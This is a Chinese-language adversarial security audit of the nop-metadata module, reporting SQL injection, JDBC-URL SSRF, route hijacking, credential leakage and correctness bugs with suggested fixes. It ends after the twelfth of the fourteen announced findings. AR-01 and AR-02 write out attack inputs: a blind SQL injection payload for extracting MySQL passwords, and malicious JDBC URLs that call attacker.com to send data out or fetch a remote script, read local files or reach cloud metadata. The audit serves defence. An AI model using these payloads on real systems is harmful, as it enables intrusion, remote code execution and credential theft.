> Audit Status: planned
> Audit Type: open-ended
> Mission: nop-metadata

# nop-metadata 开放式对抗性审计报告

- **审核模块**: `nop-metadata/`（含 8 个 Maven 子模块）
- **审核日期**: 2026-07-19
- **审计基线**: live code at HEAD
- **审计方式**: 开放式发现导向（不绑定固定维度），切入点来自代码异常信号与跨边界连锁效应
- **审计独立性声明**: 本审计与同目录 `2026-07-19-1118-multi-audit-nop-metadata.md` 完全独立执行，去重后仅报告多维度审计未发现或未深挖的新问题
- **去重策略**: 已对照多维度审计 46 条发现 + `ai-dev/bugs/` 5 条 + `ai-dev/lessons/` 4 条；任何与现有发现重叠的内容均明确标注"补充现状"或直接省略

**使用的启发式视角**：异常路径侦探、模型攻击者、事务边界追踪者、10x 规模运维者。

---

## 执行摘要

本次开放式审计发现 **14 条新问题**（多维度审计未覆盖），其中：
- **3 条 P0/P1 级安全/数据完整性问题**（schemaPattern SQL 注入、JDBC URL 完全无防护、querySpace 路由可被劫持）
- **5 条 P1/P2 级正确性问题**（OFFSET-without-LIMIT、cross-DB merge NULL 语义、参数缺失、事务边界、内存膨胀 DoS）
- **6 条 P2/P3 级工程问题**（N+1 查询、参数丢失、异常处理、文档锚点）

绝大多数发现来自"异常路径侦探"和"模型攻击者"视角：在通读代码时注意到 `validateIdentifier` 在多处被调用但 **schemaPattern 参数从不被校验**，沿此线索追踪到 3 个执行器（profiling / catalog / quality-rule）和 6 个 judge 方法均有同一漏洞。同时"10x 规模运维者"视角发现 BFS 图遍历全量加载边集，"事务边界追踪者"发现 `syncExternalTables` 事件快照逻辑有结构错误。

---

## 详细发现

### [AR-01] schemaPattern SQL 注入：3 个执行器均未对 schema 参数做标识符校验

- **文件**:
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/profiling/MetaTableProfiler.java:524-529`（`buildFromClause` + `qualifyTable`）
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/catalog/MetaCatalogCollector.java:138-153`（同模式）
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/quality/MetaQualityRuleExecutor.java:445-456`（同模式，被 6 个 judge* 方法消费：`judgeVolume/judgeFreshness/judgeNotNull/judgeUnique/judgeRange/judgeRegex`）
- **证据片段**（MetaQualityRuleExecutor）:
  ```java
  static String buildFromClause(TableReference ref, String schemaPattern) {
      if (ref.isSubquery()) {
          return "(" + ref.getSourceSql() + ") _t";
      }
      String tableName = ref.getPhysicalTableName();
      return qualifyTable(normalizeSchema(schemaPattern), tableName);   // schema 直接拼接，未校验
  }
  static String qualifyTable(String schema, String tableName) {
      if (schema == null || schema.isEmpty()) {
          return tableName;
      }
      return schema + "." + tableName;                                  // 字符串拼接
  }
  // 上层使用（line 257-258）：
  String qualified = buildFromClause(ref, schemaPattern);
  long nullCount = queryLong(conn,
          "SELECT COUNT(*) FROM " + qualified + " WHERE " + col + " IS NULL");
  // queryLong 用 Statement.executeQuery(sql)，sql 为最终拼接结果
  ```
  对照：同模块的 `NopMetaTableBizModel.buildExternalSelectSql:731-754` **正确地**调用了 `FilterToSqlTranslator.validateIdentifier(tableName)`；三个 executor 也对 `tableName`/`col` 做了 `validateIdentifier`，唯独 schema 一致地"漏了一处"。
- **严重程度**: P0
- **现状**: 三个执行器都暴露 `schemaPattern` 给最终 SQL 拼接路径（`profileTable` / `collectCatalog` / `collectCatalogForTable` / `executeQualityRule` / `executeCheckpoint`），但都跳过了对 schema 的标识符白名单校验。`schemaPattern` 是 GraphQL BizModel 的 `@Optional @Name("schemaPattern")` 参数，对外可达。
- **风险**:
  - **盲注可行**：`schemaPattern = "mysql.user WHERE user='admin' AND SUBSTRING(password,1,1)='a'--"` → 最终 SQL `SELECT COUNT(*) FROM mysql.user WHERE user='admin' AND SUBSTRING(password,1,1)='a'--.tableName WHERE col IS NULL`（`--` 注释掉后续），按返回 PASS/FAIL 即可逐字符爆破 `mysql.user.password`。
  - **information_schema 普适**：所有目标 DB 的 `information_schema` 默认对 JDBC 账户可读，可枚举所有库/表/列名。
  - **触发门槛低**：任何具有 `NopMetaQualityRule:mutation` / `NopMetaTable:mutation` / `NopMetaDataSource:mutation` 权限的用户即可触发（均会进入 quality/profiling/catalog 路径）。多条路径在多维度审计 [维度13-03] 的 `custom_sql` 中已被识别为高风险权限面，本漏洞利用相同权限面但路径不同。
  - **Statement.executeQuery 不是防御**：`executeQuery` 拒绝多结果集但允许任意 SELECT；攻击者用单 SELECT + 注释即可绕过。
- **建议**:
  1. 在 3 个 `qualifyTable`/`buildFromClause` 入口前增加 `validateIdentifier(schema)`（与 tableName 一致），失败时抛 ErrorCode（与 `ERR_CATALOG_INVALID_IDENTIFIER` / `ERR_PROFILING_INVALID_IDENTIFIER` / `ERR_QUALITY_INVALID_IDENTIFIER` 对齐）。
  2. 或抽公共 `SqlIdentifiers.qualify(schema, table)` 工具方法集中校验。
  3. **新增回归测试**：`profileTable/collectCatalog/executeQualityRule` 在 `schemaPattern = "x; DROP TABLE y"` 等典型注入 payload 下必须显式失败。
- **信心水平**: 确定（已确认无校验 + 已确认拼接路径 + 已确认权限面）
- **发现来源视角**: 模型攻击者 + 异常路径侦探（grep `validateIdentifier` 后注意到 schema 一致缺失）
- **复核状态**: 已保留

---

### [AR-02] JDBC 数据源 URL/driverClassName 完全无白名单/超时，可被用于 SSRF/RCE/DoS

- **文件**: `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/connection/MetaDataSourceConnectionService.java:94-119`
- **证据片段**:
  ```java
  private DataSource buildDataSource(String datasourceType, String connectionConfig) {
      requireJdbcType(datasourceType);
      Map<String, Object> cfg = parseConnectionConfig(connectionConfig, datasourceType);
      String jdbcUrl = requireNonBlank(cfg, CFG_JDBC_URL, datasourceType);
      String username = requireNonBlank(cfg, CFG_USERNAME, datasourceType);
      String password = requireField(cfg, CFG_PASSWORD, datasourceType);
      String driverClassName = optString(cfg, CFG_DRIVER_CLASS_NAME);   // 任意类名

      SimpleDataSource ds = new SimpleDataSource();
      ds.setUrl(jdbcUrl);                  // 任意 JDBC URL，无白名单
      ds.setUsername(username);
      ds.setPassword(password);
      if (driverClassName != null && !driverClassName.isEmpty()) {
          ds.setDriverClassName(driverClassName);   // 任意类加载
      }
      return ds;
      // 注意：未设置 setLoginTimeout / socket timeout
  }
  ```
- **严重程度**: P0
- **现状**: `NopMetaDataSource.connectionConfig`（用户配置）任意控制以下内容而无任何防护：
  1. **jdbcUrl 无协议/主机白名单**：
     - `jdbc:mysql://169.254.169.254/...`（云元数据服务 SSRF）
     - `jdbc:mysql://internal-service:3306/...`（内网扫描）
     - `jdbc:postgresql://attacker.com:5432/db`（数据外泄接收方）
     - `jdbc:mysql://target/?allowLoadLocalInfile=true&localInfile=1`（MySQL JDBC 反序列化 / 文件读取经典攻击面）
     - `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.com/poc.sql';`（H2 INIT RUNSCRIPT 远程加载，**已知 RCE 路径**）
     - `jdbc:h2:file:/etc/passwd` 或 `file:/proc/self/...`（文件读写）
  2. **driverClassName 任意**：`Class.forName(driverClassName)` 触发任意类初始化。仓库 classpath 上的脆弱驱动（如老版 H2/MySQL/PostgreSQL 驱动）的 static 初始化可被利用（参考 CommonsCollections 式 gadget）。
  3. **SimpleDataSource 无 loginTimeout**：JDBC 连接超时由 TCP 默认（Linux ~2 分钟），攻击者把 jdbcUrl 指向黑洞 IP 即可拖垮 connectionService 线程。
  4. **`requireJdbcType` 用 `UnsupportedOperationException`**：违反 [维度09-07] 已识别的"非 NopException"模式，且仅校验了类型字符串而非 URL 内容。
- **风险**:
  - 任何具有 `NopMetaDataSource:mutation` 权限的用户可：发起任意 TCP 出站连接（SSRF）、加载任意驱动类（潜在 RCE）、拖垮连接池（DoS）、读写服务器文件（H2 file:/、MySQL allowLoadLocalInfile）。
  - 即使配置文件层面已经限制权限，**测试连接 (`testConnection`) 同样进入此路径**——任何能创建数据源（哪怕只是测试）的用户都能尝试。
  - 与多维度审计 [维度13-04] 的 webhook SSRF 相比，**此向量更严重**：webhook 是 HTTP 单协议、由 Nop 服务端发起；JDBC 是任意协议、由 JDBC 驱动发起（驱动自身常带文件 IO/反序列化能力）。
- **建议**:
  1. 引入 jdbcUrl 白名单：`^jdbc:(mysql|postgresql|h2)://(allowed-host-pattern)/` 模式，禁用危险参数（`allowLoadLocalInfile`、`INIT=`、`allowMultiQueries`）。
  2. driverClassName 白名单：仅允许已知的 H2/MySQL/PostgreSQL Driver 类。
  3. 设置 `SimpleDataSource.setLoginTimeout(5)` 或显式传入超时。
  4. 改 `requireJdbcType` 抛 NopException（与 [维度09-07] 一并）。
  5. 在 data-auth.xml 限制 `NopMetaDataSource:mutation` 仅 admin 角色（与 [维度13-02] 一并）。
- **信心水平**: 确定
- **发现来源视角**: 模型攻击者 + 异常路径侦探
- **复核状态**: 已保留

---

### [AR-03] MetaDataSourceResolver 多匹配取首条 + 无唯一约束 → querySpace 路由可被低权限用户劫持

- **文件**:
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/datasource/MetaDataSourceResolver.java:50-71`
  - `nop-metadata/model/nop-metadata.orm.xml`（NopMetaDataSource 实体无 querySpace 唯一约束，对应多维度审计 [维度04-06] 报告的"仅 3 个 UK"之一）
- **证据片段**:
  ```java
  public NopMetaDataSource resolveActiveOrThrow(IEntityDao<NopMetaDataSource> dsDao, String querySpace) {
      ...
      QueryBean q = new QueryBean();
      q.addFilter(FilterBeans.eq(NopMetaDataSource.PROP_NAME_querySpace, querySpace));
      // 多匹配取首条（findFirstByQuery，§4.4 D2 + §2.7.1 D1 现状；首版不记 warning）
      NopMetaDataSource dataSource = dsDao.findFirstByQuery(q);
      ...
  }
  ```
  `findFirstByQuery` 不带 orderBy → 结果顺序由 ORM 默认（通常按主键/插入顺序，但**未保证**）。
- **严重程度**: P1
- **现状**: 多维度审计 [维度04-06] 报告了"NopMetaDataSource 缺自然键 UK"，但只指出"应用层容易插入重名数据"。**实际后果远更严重**：本方法被 6 处调用（profiling/catalog/quality/join/aggregation/sql-table-query 的物理数据源解析），决定每次外部查询发往哪个物理 DB。若两个 NopMetaDataSource 共享同一 querySpace，所有查询会被静默路由到"第一条"。
- **风险**:
  - **路由劫持**：低权限用户（仅有 `NopMetaDataSource:mutation`）创建一个 querySpace 与已有数据源相同但指向自己控制的 DB 的条目，**所有后续查询可能被路由到攻击者 DB**。攻击者 DB 返回精心构造的行数据 → 影响所有依赖该 querySpace 的查询/聚合/质量规则结果。
  - **不稳定**：ORM 重启后"第一条"的顺序可能变化，导致同一个部署在不同时间路由到不同 DB。
  - **静默**：注释明确"不记 warning"，运维无法察觉。
- **建议**:
  1. 在 `model/nop-metadata.orm.xml` 的 NopMetaDataSource 增加 `<unique-keys>` `<unique-key name="UK_NOP_META_DATASOURCE_QUERY_SPACE" columns="querySpace"/>`（plan-first，ORM 结构变更）。
  2. 在 `resolveActiveOrThrow` 增加多匹配检测：`if (count > 1) throw new NopException(ERR_DATASOURCE_DUPLICATE_QUERY_SPACE).param("querySpace", querySpace).param("dataSourceCount", count);`
  3. 短期补丁：当 `findFirstByQuery` 返回非空时再 `findAllByQuery` 计数，超 1 条记 warning + 抛 ErrorCode。
- **信心水平**: 很可能
- **发现来源视角**: 模型攻击者 + IoC 侦探
- **复核状态**: 已保留

---

### [AR-04] OFFSET without LIMIT 在 MySQL 生成非法 SQL（声称支持但实际语法错误）

- **文件**:
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/entity/NopMetaTableBizModel.java:770-777`（`appendLimitOffset`）
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/query/MetaAggregationExecutor.java:514-521, 625-630, 812-818`
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/query/MetaJoinExecutor.java:338-345, 400-407, 789-794`
- **证据片段**（NopMetaTableBizModel）:
  ```java
  private static void appendLimitOffset(StringBuilder sb, Long limit, Long offset) {
      if (limit != null) {
          sb.append(" LIMIT ?");
      }
      if (offset != null && offset > 0) {
          sb.append(" OFFSET ?");                  // 无 LIMIT 也可能拼上 OFFSET
      }
  }
  ```
  声明支持 MySQL：`SUPPORTED_QUERY_DIALECTS = {"H2", "MySQL", "PostgreSQL"}`（line 205-206）。
- **严重程度**: P1
- **现状**: 当用户调用 `queryTableData(metaTableId, filter, null, 100)`（limit=null, offset=100）时，生成的 SQL 为 `SELECT col1 FROM t OFFSET ?`，**MySQL 不接受没有 LIMIT 的 OFFSET**（MySQL 语法仅 `LIMIT [offset,] row_count` 或 `LIMIT row_count OFFSET offset`）。PostgreSQL / H2 允许独立 OFFSET，所以测试用 H2 不会暴露此 bug。
- **风险**:
  - 6 处共一个 bug，跨 3 个执行器（单表查询 / JOIN / 聚合）。
  - 调用方仅 offset 不传 limit 是合理的分页第二页请求（"已知上一页最后位置，只想要偏移 100 行的所有剩余"）。
  - 失败模式：MySQL 抛 SQL syntax error，被 catch 转为 `ERR_QUERY_SQL_EXEC_FAILED`，错误消息误导（"SQL execution failed"，看起来是 DB 故障）。
  - **测试未覆盖**：`grep "offset:" TestNopMetaTableQueryBizModel.java` 找不到只传 offset 不传 limit 的测试。
- **建议**:
  - 方案 A（语义清晰）：调用方传 offset 但 limit=null 时，默认 limit = `Integer.MAX_VALUE`（或某 LARGE_PAGE_LIMIT）。
  - 方案 B（按方言分派）：方言为 MySQL 时若仅有 offset，自动改为 `LIMIT 18446744073709551615 OFFSET ?`（MySQL 约定的"无限大 LIMIT"）。
  - 方案 C（拒绝）：API 层校验 `offset != null && limit == null` → 抛 ErrorCode。
- **信心水平**: 确定
- **发现来源视角**: 异常路径侦探
- **复核状态**: 已保留

---

### [AR-05] crossDbMerge 用 String key 匹配，NULL=NULL 匹配且类型错配静默通过（违反 SQL 语义）

- **文件**: `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/query/MetaJoinExecutor.java:463-508, 528-538, 898-900`
- **证据片段**:
  ```java
  // line 482-486：建索引时 NULL 也作为有效 key
  Map<String, List<Map<String, Object>>> rightIndex = new HashMap<>();
  for (Map<String, Object> r : rightRows) {
      String key = stringKey(getCaseInsensitive(r, rightField));   // null 值 → key=null
      rightIndex.computeIfAbsent(key, k -> new ArrayList<>()).add(r);
  }
  // line 492-494：左行 NULL key 也会匹配
  for (Map<String, Object> l : leftRows) {
      String key = stringKey(getCaseInsensitive(l, leftField));
      List<Map<String, Object>> matches = rightIndex.get(key);
      ...
  }
  // line 898-900：stringKey 转字符串
  private static String stringKey(Object v) {
      return v == null ? null : String.valueOf(v);
  }
  ```
- **严重程度**: P1
- **现状**: 跨库 JOIN 在 Java 内存中合并，用 `String.valueOf(...)` 作为 join key。导致两类语义错误：
  1. **NULL = NULL 匹配**：SQL 标准下 `NULL = NULL` 求值为 `UNKNOWN`，INNER JOIN 不产生行、LEFT JOIN 右侧为 NULL。但本代码 `rightIndex.get(null)` 会返回右表中 join key 为 NULL 的所有行，错误地与左表的 NULL 行配对。
  2. **类型错配静默相等**：`String.valueOf(Long 1L)` == `String.valueOf(Integer 1)` == `"1"`，但 SQL 视为同值；更严重的：`BigDecimal 1.0` 与 `Integer 1` `String.valueOf` 后为 `"1.0"` vs `"1"`，不相等，但 SQL 视为同值（数值相等）。
  3. **跨列类型不对称**：左表 join key 列是 INT，右表是 VARCHAR，原本 SQL 会因类型不兼容报错或返回空，本代码可能"恰好匹配"（"123" == "123"）。
- **风险**:
  - 跨库 JOIN 的结果集与同库原生 JOIN 不一致（用户预期"JOIN 语义跨库同样正确"，实际不是）。
  - INNER JOIN NULL 行被错误保留 → 后续聚合 SUM/COUNT 静默错误（与 [维度02-02] 担心的"聚合错误"风险叠加）。
  - 数据类型差异（entity 字段类型 vs external 物理列类型）会让"看似合理的 join"静默错配。
- **建议**:
  1. NULL key 不参与匹配：`if (key == null) continue;`（与 SQL NULL 语义一致）。
  2. 类型感知比较：跨库 join 时要求两侧 join key 的 JDBC 类型一致，否则抛 ErrorCode（不静默合并）。
  3. 至少加注释明确"NULL=NULL 不匹配"的语义，并加测试。
- **信心水平**: 确定（语义层面）
- **发现来源视角**: 异常路径侦探
- **复核状态**: 已保留

---

### [AR-06] syncExternalTables 事件快照 before==after，且对未变更实体发布 ENTITY_UPDATED 事件

- **文件**: `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/entity/NopMetaDataSourceBizModel.java:185-196`
- **证据片段**:
  ```java
  // 元数据变更事件（架构基线 §2.8 D3）：外部表同步是批量操作，主实体级记录 1 行 DataSource UPDATED
  // （changeSource=SYNC，表述「外部表已同步」）。子实体细粒度事件（per-table）deferred。
  // 事件行在持久化成功后写入，避免幽灵事件。before 为同步前的数据源快照。
  String beforeSnapshot = eventPublisher.buildSnapshot(dataSource, EVENT_ENTITY_TYPE, dataSourceId);
  orm().flushSession();
  String afterSnapshot = eventPublisher.buildSnapshot(dataSource, EVENT_ENTITY_TYPE, dataSourceId);
  ```
  注释说 "before 为同步前的数据源快照"，但代码在 **sync 循环完成后**（line 165-183）才捕获 before，且 dataSource 实体本身在 sync 中**从未被修改**（只是子实体 NopMetaTable 被创建/更新）。因此 before 与 after 内容完全一致。
- **严重程度**: P2
- **现状**:
  1. **before/after 相同**：`dataSource` 在 sync 过程中未变，两个快照内容相同（只有可能的 ORM flushSession 后的 updatedAt 之类 audit 字段差异，但本实体无此类字段）。订阅者拿到 ENTITY_UPDATED 事件但 diff 为空。
  2. **事件类型误导**：实际同步修改的是 NopMetaTable（子实体），但发布的是 NopMetaDataSource UPDATED 事件。下游订阅者按 `entityType=NopMetaDataSource` 过滤会得到误导信号。
  3. **`changeSource=SYNC` 暗示是同步操作**：但事件结构 ENTITY_UPDATED + 相同 before/after 使其在 audit 视图上无法与真正的字段更新区分。
- **风险**:
  - 审计追踪困难：审计员查"哪个数据源被同步过"需要回放整个 NopMetaModelChangedEvent 表并按 `changeSource=SYNC` 过滤，没有"per-table 同步"事件。
  - 订阅者逻辑混乱：未来接入消息系统后，订阅者收到 ENTITY_UPDATED 但实体未变会触发不必要的下游处理。
  - **凭据泄露放大**（与 [AR-09] 联动）：before/after 都包含完整 `connectionConfig` JSON（含明文密码），相当于同一份凭据 **在同一个事件行里被序列化两次**，凭据数据二次落盘。
- **建议**:
  1. 移除 before/after 同步路径的事件发布（或改为发布新的 `entityType=NopMetaTable` / `eventType=ENTITY_SYNCED` 子实体事件）。
  2. 若坚持主实体事件，应在 sync 循环 **之前** 捕获 before，循环 **之后** 捕获 after，并附带 `syncedTableCount` 等业务字段进入 `details`。
  3. 至少把 `changeSource=SYNC` 改为独立 `eventType=SYNCED`，避免与 ENTITY_UPDATED 语义混淆。
- **信心水平**: 确定
- **发现来源视角**: 事务边界追踪者 + 异常路径侦探
- **复核状态**: 已保留

---

### [AR-07] connectionConfig 明文密码随变更事件二次落盘到 NopMetaModelChangedEvent.{before,after}Snapshot

- **文件**: `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/event/MetaModelChangedEventPublisher.java:147-170`
- **证据片段**:
  ```java
  private Map<String, Object> buildEntitySnapshot(Object entity) {
      if (entity instanceof io.nop.orm.IOrmEntity) {
          io.nop.orm.IOrmEntity ormEntity = (io.nop.orm.IOrmEntity) entity;
          IEntityModel model = ormEntity.orm_entityModel();
          Map<String, Object> map = new LinkedHashMap<>();
          if (model != null) {
              for (IColumnModel col : model.getColumns()) {     // 遍历所有列，无脱敏
                  String name = col.getName();
                  Object value = ormEntity.orm_propValueByName(name);
                  ...
                  map.put(name, value);                          // connectionConfig 也直接放入
              }
          }
          return map;
      }
      ...
  }
  ```
  NopMetaDataSourceBizModel 的 save/delete override、syncExternalTables、collectCatalog 等均调用 `eventPublisher.publishEvent(publishEventWithSnapshots)` 传入 `dataSource` 实体 → connectionConfig JSON（含明文 password）被原样序列化到 `NopMetaModelChangedEvent.beforeSnapshot` 和 `afterSnapshot`。
- **严重程度**: P1
- **现状**: 多维度审计 [维度13-01] 已指出 connectionConfig 通过 GraphQL `query { NopMetaDataSource__findPage { connectionConfig } }` 可读。**但本漏洞是独立的额外泄露路径**：即使 [维度13-01] 修复（例如 xmeta 设 `published="false"`），凭据仍会通过事件流写入 NopMetaModelChangedEvent 表。任何具有 `NopMetaModelChangedEvent:query` 权限的用户可读到。
- **风险**:
  - 凭据二次落盘 → 备份/日志/审计系统中明文密码分布扩大。
  - 与 [AR-06] 联动后，syncExternalTables 一次操作会在同一事件行写 2 份相同明文密码。
  - NopMetaModelChangedEvent 表通常保留时间长（审计需求），凭据轮换后旧密码仍可被读出。
  - 若事件流未来接入消息系统（架构基线 §2.8 提及），凭据会随消息流出到所有订阅者。
- **建议**:
  1. 在 `buildEntitySnapshot` 中引入 sensitive-column 屏蔽：对 `connectionConfig` 类字段返回 `"***REDACTED***"` 或仅保留 `jdbcUrl`（脱敏掉 username/password）。
  2. 或在 NopMetaDataSource 实体的 `connectionConfig` 列上加 ext 标记 `sensitive="true"`，本 helper 读取该标记后跳过。
  3. 已落盘的历史事件行需评估是否需要轮换 / 加密 / 删除。
- **信心水平**: 确定
- **发现来源视角**: 异常路径侦探（沿 [维度13-01] 顺藤摸瓜找到事件流路径）
- **复核状态**: 已保留

---

### [AR-08] `Math.toIntExact(limit/offset)` 在 cross-DB 路径会抛 ArithmeticException 而非显式 ErrorCode

- **文件**:
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/query/MetaJoinExecutor.java:831, 837`（`truncate`）
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/query/MetaAggregationExecutor.java:1565, 1571`（cross-db in-memory 分页）
- **证据片段**（MetaJoinExecutor.truncate）:
  ```java
  private List<Map<String, Object>> truncate(List<Map<String, Object>> rows, Long limit, Long offset) {
      int from = (offset != null && offset > 0) ? Math.toIntExact(offset) : 0;     // overflow → ArithmeticException
      ...
      if (limit != null) {
          to = Math.min(rows.size(), from + Math.toIntExact(limit));                // overflow → ArithmeticException
      }
      return new ArrayList<>(rows.subList(from, to));
  }
  ```
- **严重程度**: P2
- **现状**: 跨库 in-memory 合并的分页/截断路径用 `Math.toIntExact` 把 Long 截成 int。当用户传入 `offset > Integer.MAX_VALUE` 或 `limit > Integer.MAX_VALUE` 时直接抛 `ArithmeticException`（继承 RuntimeException），绕过 ErrorCode 体系，错误响应不含 `metaTableId` / `joinId` 等业务上下文。
- **风险**:
  - 错误处理不一致：同模块其他失败路径都抛 `NopException` + ErrorCode，此处绕过。
  - 调用方拿到 `ArithmeticException` 难以诊断。
  - 与 [维度09-05 / 09-06] 的"非 NopException"问题同类，但未被多维度审计发现。
- **建议**:
  ```java
  if (offset != null && offset > Integer.MAX_VALUE) {
      throw new NopException(ERR_PAGINATION_OFFSET_TOO_LARGE).param("offset", offset)...;
  }
  ```
- **信心水平**: 确定
- **发现来源视角**: 异常路径侦探
- **复核状态**: 已保留

---

### [AR-09] buildLineageGraph / buildTableNameIndex 全量加载，无分页 / 无 size limit → 任意 query 用户可触发 OOM

- **文件**: `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/entity/NopMetaLineageEdgeBizModel.java:628-643, 681-691`
- **证据片段**:
  ```java
  private LineageGraph buildLineageGraph() {
      List<NopMetaLineageEdge> edges = dao().findAll();           // 全表加载
      ...
  }
  private Map<String, String> buildTableNameIndex() {
      IEntityDao<NopMetaTable> tableDao = daoFor(NopMetaTable.class);
      List<NopMetaTable> tables = tableDao.findAll();             // 全表加载
      ...
  }
  ```
  调用方：`getUpstream` / `getDownstream` / `getLineagePath` / `getImpactAnalysis` / `extractLineageFromSql` / `extractColumnLineageFromSql` 都是 `@BizQuery` 或 `@BizMutation` 公开 API。
- **严重程度**: P1
- **现状**: 注释 "元数据目录量级、边数小" 是开发期假设，未在 ORM 层加任何上限。生产环境血缘边数随以下因素线性增长：
  - 列级血缘：每个 SQL 视图 50 列 × 每列引用 3 个源列 = 150 条边/视图；100 个视图 = 1.5 万边。
  - 时间维度：每次 `extractColumnLineageFromSql` 都 upsert 不删（无 D6 replace 语义）→ 边数随重抽次数线性增长。
  - 100 张表 × 平均 100 列 × 平均 5 次重抽 = 50 万边。
- **风险**:
  - **DoS 可达**：任何具有 `NopMetaLineageEdge:query` 权限的用户调 `getUpstream(metaTableId)` 即触发全表加载。10 万行级 NopMetaLineageEdge + Java 对象 Map 化大约几 GB 内存。OOM 即崩。
  - **延迟**：单次 BFS 调用在 10 万边量级可能数十秒，连接池被占满。
  - **图遍历特性**：BFS 本可在 SQL 层按 adjacency 逐跳查询，无需全量加载（注释承认但选择"避免逐跳查询"，取舍偏简化）。
- **建议**:
  1. 加 size 上限守卫：`if (edges.size() > 100_000) throw new NopException(ERR_LINEAGE_GRAPH_TOO_LARGE).param("edges", edges.size());`
  2. 改为按 adjacency SQL 分页查询（每跳 `WHERE sourceTableId IN (?)`），用 visited set 防环。
  3. 短期：把 `getUpstream/getDownstream/getLineagePath/getImpactAnalysis` 提升到 admin-only 权限。
- **信心水平**: 确定
- **发现来源视角**: 10x 规模运维者
- **复核状态**: 已保留

---

### [AR-10] upsertSqlParseEdge / upsertColumnSqlParseEdge / upsertMeasureParseEdge N+1 查询模式

- **文件**: `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/entity/NopMetaLineageEdgeBizModel.java:700-801`
- **证据片段**:
  ```java
  private void upsertColumnSqlParseEdge(String sourceTableId, String targetTableId,
                                         String sourceColumn, String targetColumn, String transformType) {
      QueryBean q = new QueryBean();
      q.addFilter(FilterBeans.eq(..., sourceTableId));
      q.addFilter(FilterBeans.eq(..., targetTableId));
      q.addFilter(FilterBeans.eq(..., sourceColumn));
      q.addFilter(FilterBeans.eq(..., targetColumn));
      q.addFilter(FilterBeans.eq(..., lineageSource));
      NopMetaLineageEdge edge = dao().findFirstByQuery(q);   // 1 SELECT
      if (edge == null) {
          edge = dao().newEntity();
          ...
          dao().saveEntity(edge);                             // 1 INSERT
      } else {
          edge.setTransformType(transformType);
          dao().updateEntity(edge);                           // 1 UPDATE
      }
  }
  // 调用方：extractColumnLineageFromSql 对每条 candidate 调一次
  ```
- **严重程度**: P2
- **现状**: `extractColumnLineageFromSql` / `extractMeasureLineage` 对每个候选边独立 SELECT + INSERT/UPDATE。一个 50 列的 SQL 视图 → 150 个 candidate → 150 次 SELECT + 150 次 INSERT，全在同一个 `@BizMutation` 事务中。
- **风险**:
  - 大型 SQL 视图抽取事务可能几分钟才完成，长事务持有 ORM session 与连接。
  - 与 [AR-09] 叠加：边数越多 → 后续 upsert 越慢 → 增长越快越卡。
- **建议**:
  1. 批量查询：`findAllByQuery(sourceTableId IN (...) AND targetTableId = ? AND lineageSource = ?)`，Java 层按五元组 map 已存在的。
  2. 批量保存：用 `dao().saveBatch(...)` 或类似机制。
  3. 增加 `extractColumnLineageFromSql` 的 timeout 配置。
- **信心水平**: 很可能
- **发现来源视角**: 10x 规模运维者
- **复核状态**: 已保留

---

### [AR-11] evalExpectPassWhen 解析失败抛 `NumberFormatException`，绕过 ErrorCode 体系

- **文件**: `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/quality/MetaQualityRuleExecutor.java:509-531`
- **证据片段**:
  ```java
  private static boolean evalExpectPassWhen(String expectPassWhen, double value) {
      String s = expectPassWhen.trim().toLowerCase();
      ...
      if (s.startsWith("eq ")) {
          return value == Double.parseDouble(s.substring(3).trim());    // NFE on "eq abc"
      }
      if (s.startsWith("gt ")) {
          return value > Double.parseDouble(s.substring(3).trim());     // NFE on "gt abc"
      }
      ...
  }
  ```
  调用方（`judgeCustomSql` line 237）直接 `pass = evalExpectPassWhen(expectPassWhen, value)`，未 try/catch。
- **严重程度**: P2
- **现状**: 用户配置 `expectPassWhen="gt abc"` 时，`Double.parseDouble("abc")` 抛 `NumberFormatException`（继承 RuntimeException）。该异常向上穿过 `judgeCustomSql` → `judge` → executor → BizModel，最终在 GraphQL 出口被 catch 包装。规则结果中无该规则的 ERROR 行（因为整批 action 都失败），用户拿不到 per-rule 失败信息。
- **风险**:
  - 一条配置错误的规则会让整个 checkpoint 失败，掩盖其他规则的执行结果。
  - 与同模块的 per-rule try/catch 隔离模式（`MetaQualityRuleExecutor.judge` line 60-77 的 try/catch）不一致。
  - 错误消息 "For input string: \"abc\"" 不含业务上下文。
- **建议**:
  ```java
  try {
      return value > Double.parseDouble(s.substring(3).trim());
  } catch (NumberFormatException e) {
      throw new NopException(ERR_QUALITY_EXPECT_PASS_WHEN_INVALID)
              .param("expectPassWhen", expectPassWhen).param("reason", "not a number");
  }
  ```
  或在 judgeCustomSql 调用处把 NFE 转 `j.setStatus("ERROR"); j.setMessage("...");`。
- **信心水平**: 确定
- **发现来源视角**: 异常路径侦探
- **复核状态**: 已保留

---

### [AR-12] `queryLong`/`querySingleValue` 用 `Statement.executeQuery` 直接拼接 SQL，与同模块 `PreparedStatement` 风格不一致

- **文件**:
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/quality/MetaQualityRuleExecutor.java:453-467`（`queryLong`）
  - 同文件 `469-481`（`queryTimestamp`）
  - 同文件 `484-507`（`querySingleValue`）
- **证据片段**:
  ```java
  private static long queryLong(Connection conn, String sql) {
      LOG.info("qualityRule SQL: {}", sql);
      try (Statement st = conn.createStatement(); ResultSet rs = st.executeQuery(sql)) {
          ...
      }
  }
  ```
  对照：同文件 `judgeRange`（line 326）和 `judgeRegex`（line 375）正确使用了 `PreparedStatement`。
- **严重程度**: P3
